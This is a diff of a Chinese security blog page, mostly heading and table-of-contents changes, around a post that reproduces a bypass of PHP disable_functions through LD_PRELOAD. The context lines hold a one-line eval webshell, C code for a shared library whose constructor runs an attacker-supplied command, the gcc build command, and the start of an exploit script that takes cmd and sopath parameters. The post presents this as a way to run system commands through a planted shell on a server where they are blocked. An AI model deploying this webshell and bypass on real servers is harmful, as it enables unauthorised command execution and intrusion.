@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="#前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做">
+<meta name="description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 <meta property="og:type" content="article">
 <meta property="og:title" content="「disablefunc绕过」一种绕过php disablefunc的方法复现">
 <meta property="og:url" content="http://MaiKeFee.com/archives/2ea7b633.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="#前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做">
+<meta property="og:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-28T08:36:48.427Z">
+<meta property="og:updated_time" content="2019-08-28T08:40:27.754Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="「disablefunc绕过」一种绕过php disablefunc的方法复现">
-<meta name="twitter:description" content="#前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做">
+<meta name="twitter:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 
 
 
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:36:48+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:40:27+08:00">
                 2019-08-28
               </time>
             
@@ -439,13 +439,11 @@
       
 
       
-        <p>#前言<br>无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。</p>
 <p>我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。</p>
-<p>###环境搭建<br>ubuntu+apache2+php7.2</p>
-<p>###配置</p>
-<p>/etc/php/7.2/apache2/php.ini</p>
-<p>###设置</p>
-<pre><code>disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</code></pre><p>然后重启apache2 服务器</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ubuntu+apache2+php7.2</p>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>/etc/php/7.2/apache2/php.ini</p>
+<h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><pre><code>disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</code></pre><p>然后重启apache2 服务器</p>
 <p>这样就能把system禁用了</p>
 <p>然后在网站的根目录上放一个shell.php</p>
 <pre><code>&lt;?php  @eval($_GET[&apos;fz41&apos;]);?&gt;</code></pre><p>###访问shell.php</p>
@@ -470,7 +468,7 @@ __attribute__ ((__constructor__)) void preloadme (void)
     unsetenv(&quot;LD_PRELOAD&quot;);
     const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
     system(cmdline);
-}</code></pre><p>###工具使用<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+}</code></pre><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
 <p>复现<br>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so<br>然后写利用如下php</p>
 <pre><code>&lt;?php
     echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so  &lt;/p&gt;&quot;;
@@ -574,8 +572,17 @@ __attribute__ ((__constructor__)) void preloadme (void)
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -644,6 +651,22 @@ __attribute__ ((__constructor__)) void preloadme (void)
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置"><span class="nav-number">1.0.2.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置"><span class="nav-number">1.0.3.</span> <span class="nav-text">设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具使用"><span class="nav-number">1.0.4.</span> <span class="nav-text">工具使用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
